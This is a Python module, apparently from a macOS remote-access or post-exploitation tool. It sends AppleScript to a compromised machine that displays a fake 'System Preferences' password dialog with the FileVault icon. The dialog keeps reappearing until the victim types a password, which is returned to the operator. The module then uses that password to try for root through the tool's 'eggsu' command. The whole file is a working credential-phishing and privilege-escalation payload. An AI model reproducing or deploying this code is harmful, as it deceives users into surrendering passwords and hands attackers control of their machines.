import time
import json
import modules.helper as h

class command:
    def __init__(self):
        self.name = "prompt"
        self.description = "prompt user to type password"
        self.type = "applescript"

    def run(self,session,cmd_data):
        payload = """
        tell application "Finder"
            activate

            set myprompt to "Type your password to allow System Preferences to make changes"
                        
            set ans to "Cancel"

            repeat
                try
                    set d_returns to display dialog myprompt default answer "" with hidden answer buttons {"Cancel", "OK"} default button "OK" with icon path to resource "FileVaultIcon.icns" in bundle "/System/Library/CoreServices/CoreTypes.bundle"
                    set ans to button returned of d_returns
                    set mypass to text returned of d_returns
                    if mypass > "" then exit repeat
                end try
            end repeat
                        
            try
                do shell script "echo " & quoted form of mypass
            end try
        end tell
        """
        cmd_data.update({"cmd":"applescript","args":payload})
        password = session.send_command(cmd_data).strip()
        #display response
        print h.COLOR_INFO+"[*]  "+h.WHITE+"Response: "+h.GREEN+password+h.WHITE
        #prompt for root
        tryroot = raw_input("Would you like to try for root? (Y/n) ")
        tryroot = tryroot if tryroot else "y"
        if tryroot.lower() != "y":
            return ""
        #TODO: I am so lazy, probably should use the su command
        password = password.replace("\\","\\\\").replace("'","\\'")
        cmd_data.update({"cmd":"eggsu","args":password})
        result = session.send_command(cmd_data)
        if "root" in result:
            h.info_general("Root Granted")
            time.sleep(0.2)
            h.info_general("Escalating Privileges")
            if session.server.is_multi == False:
                session.server.update_session(session)
            else:
                session.needs_refresh = True
        else:
            print "failed getting root"
        return ""

